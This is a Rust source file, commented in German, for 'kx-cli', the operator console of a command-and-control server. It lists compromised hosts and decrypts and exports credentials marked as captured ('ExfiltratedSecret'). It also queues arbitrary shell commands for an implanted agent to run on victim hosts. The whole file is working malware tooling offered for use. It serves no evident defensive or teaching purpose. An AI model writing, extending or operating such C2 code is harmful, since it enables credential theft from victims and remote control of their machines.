//! Kx-CLI: Operator-Oberfläche für den Kx-C2-Server.
//!
//! Ermöglicht das Auflisten von Hosts und Secrets sowie den Export von
//! erbeuteten Credentials. Kommuniziert über TLS mit dem C2-Backend.

mod client;
mod decrypt;

use std::path::PathBuf;

use clap::{Parser, Subcommand};
use tracing::{error, info};

#[derive(Parser)]
#[command(name = "kx-cli", about = "Kx-Operator-Oberfläche")]
struct Cli {
    /// URL des C2-Servers (https://host:port).
    #[arg(long, env = "KX_C2_URL")]
    server: String,
    /// Bearer-Token für den C2-Server.
    #[arg(long, env = "KX_C2_TOKEN")]
    token: String,
    /// Pfad zum Server-Zertifikat (PEM).
    #[arg(long)]
    cert: String,

    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    /// Alle registrierten Hosts auflisten.
    Hosts,
    /// Alle erbeuteten Secrets auflisten.
    Secrets {
        /// Optionaler Filter nach Benutzername (Teilstring).
        #[arg(long)]
        user: Option<String>,
        /// Die Secrets mit dem geheimen Server-Schluessel entschluesseln.
        ///
        /// Ohne diese Option bleibt das Passwort verschluesselt.
        #[arg(long)]
        decrypt: bool,
        /// Pfad zum geheimen Server-Schluessel (JSON) — noetig fuer --decrypt.
        #[arg(long)]
        server_key: Option<PathBuf>,
    },
    /// Secrets in eine Datei exportieren (JSON oder CSV).
    Export {
        /// Zielpfad für den Export.
        path: PathBuf,
        /// Format: json oder csv.
        #[arg(long, default_value = "json")]
        format: String,
        /// Die Secrets vor dem Export entschluesseln.
        #[arg(long)]
        decrypt: bool,
        /// Pfad zum geheimen Server-Schluessel (JSON) — noetig fuer --decrypt.
        #[arg(long)]
        server_key: Option<PathBuf>,
    },
    /// Alle Tasks auflisten.
    Tasks,
    /// Einen Task anlegen — der Agent holt ihn ab und führt ihn aus.
    TaskCreate {
        /// Kennung des Ziel-Hosts (siehe `kx-cli hosts`).
        #[arg(long)]
        host_id: String,
        /// Der auszuführende Befehl.
        #[arg(long)]
        command: String,
    },
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
        )
        .init();

    let cli = Cli::parse();
    let c = match client::Client::new(&cli.server, &cli.token, &cli.cert) {
        Ok(c) => c,
        Err(e) => {
            error!("Client-Init fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };

    match &cli.command {
        Command::Hosts => match c.hosts().await {
            Ok(hosts) => {
                info!("{} Hosts gefunden", hosts.len());
                for h in &hosts {
                    println!("{:<15} {:<20} {:<15} {}", h.ip, h.hostname, h.os, h.status);
                }
            }
            Err(e) => {
                error!("Host-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Secrets {
            user,
            decrypt,
            server_key,
        } => match c.secrets().await {
            Ok(secrets) => {
                let filtered: Vec<_> = secrets
                    .iter()
                    .filter(|s| user.as_deref().map_or(true, |u| s.username.contains(u)))
                    .collect();
                info!("{} Secrets gefunden", filtered.len());
                if *decrypt {
                    let eigen: Vec<_> = filtered.iter().map(|s| (*s).clone()).collect();
                    let entschluesselt = entschluesseln(&c, server_key.as_deref(), &eigen).await;
                    for s in &entschluesselt {
                        println!(
                            "{:<20} {:<20} {:<30} {:<15} {}",
                            s.host_id, s.cred_type, s.username, s.source, s.password
                        );
                    }
                } else {
                    for s in &filtered {
                        let passwort = if s.password.is_empty() {
                            "<verschluesselt>".to_string()
                        } else {
                            s.password.clone()
                        };
                        println!(
                            "{:<20} {:<20} {:<30} {:<15} {}",
                            s.host_id, s.cred_type, s.username, s.source, passwort
                        );
                    }
                }
            }
            Err(e) => {
                error!("Secret-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Export {
            path,
            format,
            decrypt,
            server_key,
        } => match c.secrets().await {
            Ok(secrets) => {
                let zu_exportieren: Vec<kx_core::c2::ExfiltratedSecret> = if *decrypt {
                    entschluesseln(&c, server_key.as_deref(), &secrets)
                        .await
                        .into_iter()
                        .map(|k| {
                            let wert = k.password.clone();
                            kx_core::c2::ExfiltratedSecret {
                                id: String::new(),
                                host_id: k.host_id,
                                cred_type: k.cred_type,
                                username: k.username,
                                password: String::new(),
                                source: k.source,
                                collected_at: String::new(),
                                sealed_password: String::new(),
                            }
                            .mit_passwort(&wert)
                        })
                        .collect()
                } else {
                    secrets.clone()
                };
                match client::export(&zu_exportieren, path, format) {
                    Ok(()) => info!(
                        "{} Secrets nach {} exportiert",
                        zu_exportieren.len(),
                        path.display()
                    ),
                    Err(e) => {
                        error!("Export fehlgeschlagen: {e}");
                        std::process::exit(1);
                    }
                }
            }
            Err(e) => {
                error!("Secret-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Tasks => match c.tasks().await {
            Ok(tasks) => {
                info!("{} Tasks gefunden", tasks.len());
                for t in &tasks {
                    println!("{:<36} {:<20} {}", t.id, t.status, t.created_at);
                }
            }
            Err(e) => {
                error!("Task-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::TaskCreate { host_id, command } => {
            let req = kx_core::c2::CreateTaskRequest {
                host_id: host_id.clone(),
                command: command.clone(),
            };
            match c.create_task(&req).await {
                Ok(id) => info!("Task {id} für {host_id} angelegt: {command}"),
                Err(e) => {
                    error!("Task-Anlage fehlgeschlagen: {e}");
                    std::process::exit(1);
                }
            }
        }
    }
}

/// Entschluesselt die Secrets mit dem geheimen Server-Schluessel.
///
/// Ohne Schluesseldatei bricht das ab — ohne den Schluessel lassen sich die
/// Passwoerter nicht lesen.
async fn entschluesseln(
    client: &client::Client,
    server_key: Option<&std::path::Path>,
    secrets: &[kx_core::c2::ExfiltratedSecret],
) -> Vec<decrypt::Klartext> {
    let pfad = match server_key {
        Some(p) => p,
        None => {
            error!("--decrypt braucht --server-key <datei>");
            std::process::exit(1);
        }
    };
    let entschluesseler = match decrypt::Decryptor::load(pfad) {
        Ok(d) => d,
        Err(e) => {
            error!("Server-Schluessel unbrauchbar: {e}");
            std::process::exit(1);
        }
    };
    let hosts = match client.hosts().await {
        Ok(h) => h,
        Err(e) => {
            error!("Host-Abfrage fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };
    entschluesseler.decrypt_all(&hosts, secrets)
}
